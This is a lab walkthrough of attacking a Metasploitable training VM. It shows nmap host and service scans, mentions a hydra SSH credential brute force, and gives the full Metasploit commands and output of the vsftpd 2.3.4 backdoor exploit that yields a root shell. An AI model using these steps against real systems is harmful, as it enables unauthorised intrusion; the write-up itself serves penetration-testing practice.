
![](../../images/Pasted%20image%2020250605093358.png)
First Lets search for the IP of the metasploit
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sP 192.168.59.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 21:29 EDT
Nmap scan report for 192.168.59.1
Host is up (0.0026s latency).
Nmap scan report for 192.168.59.2
Host is up (0.0014s latency).
Nmap scan report for 192.168.59.128
Host is up (0.0012s latency).
Nmap scan report for 192.168.59.157
Host is up (0.0025s latency).
Nmap scan report for 192.168.59.158
Host is up (0.0018s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 3.40 seconds

```

We get few ip `192.168.59.1`, `192.168.59.2` , `192.168.59.128`, `192.168.59.157`
and `192.168.59.158` is ourself

But the IP for our metasploit is most likely` .157` since our kali is` .158` . Let's try to brute force the ssh based on the users.txt and password.txt given by using hydra


![](../../images/Pasted%20image%2020250612024215.png)

We get the username and password , msfadmin:msfadmin. Now let's see what service is running and what port is open

```bash                       
┌──(kali㉿kali)-[~]
└─$ nmap -sV 192.168.59.157
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 21:31 EDT
Nmap scan report for 192.168.59.157
Host is up (0.0021s latency).
Not shown: 977 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.47 seconds
```

So we get a lot but lets try to exploit vsftpd

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.59.157
exploit
```

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ msfconsole
Metasploit tip: The use command supports fuzzy searching to try and 
select the intended module, e.g. use kerberos/get_ticket or use 
kerberos forge silver ticket
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |                                            
  +---------------------------+---------------------------+                                            
  |      __________________   |                           |                                            
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |                                            
  |             )=\           | |  EXPLOIT   \            |                                            
  |            // \\          | |_____________\_______    |                                            
  |           //   \\         | |==[msf >]============\   |                                            
  |          //     \\        | |______________________\  |                                            
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |                                            
  |        //         \\      |  *********************    |                                            
  +---------------------------+---------------------------+                                            
  |      o O o                |        \'\/\/\/'/         |                                            
  |              o O          |         )======(          |                                            
  |                 o         |       .'  LOOT  '.        |                                            
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |                                            
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |                                            
  | |________________|__|)__| |    |     __||_)     |     |                                            
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |                                            
  |  = = = = = = = = = = = =  |     '--------------'      |                                            
  +---------------------------+---------------------------+                                            


       =[ metasploit v6.4.18-dev                          ]
+ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]
+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.59.157
RHOSTS => 192.168.59.157
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.59.157:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.59.157:21 - USER: 331 Please specify the password.
[+] 192.168.59.157:21 - Backdoor service has been spawned, handling...
[+] 192.168.59.157:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.59.158:40751 -> 192.168.59.157:6200) at 2025-06-11 13:49:04 -0400


```

Lets see what access we have
```bash
whoami
root
```

Yup we get the root access. 